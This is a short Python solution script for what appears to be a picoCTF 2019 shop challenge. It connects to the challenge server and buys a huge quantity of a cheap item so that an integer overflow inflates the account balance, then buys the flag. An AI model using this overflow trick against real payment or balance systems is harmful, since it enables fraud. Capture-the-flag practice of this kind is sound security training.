import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("2019shell1.picoctf.com", 25858))

s.recv(1024)
s.recv(1024)

# Buys a "knockoff" flag with a number that will overflow to subtract a
# large negative number (adding heaps). Then buys good flag
s.send("2\n".encode())
s.recv(1024)
s.recv(1024)
s.send("1\n".encode())
s.recv(1024)
s.send("2147483500\n".encode())
s.recv(1024)
s.send("2\n".encode())
s.recv(1024)
s.recv(1024)
s.send("2\n".encode())
s.recv(1024)
s.recv(1024)
s.send("1\n".encode())
print(s.recv(1024))
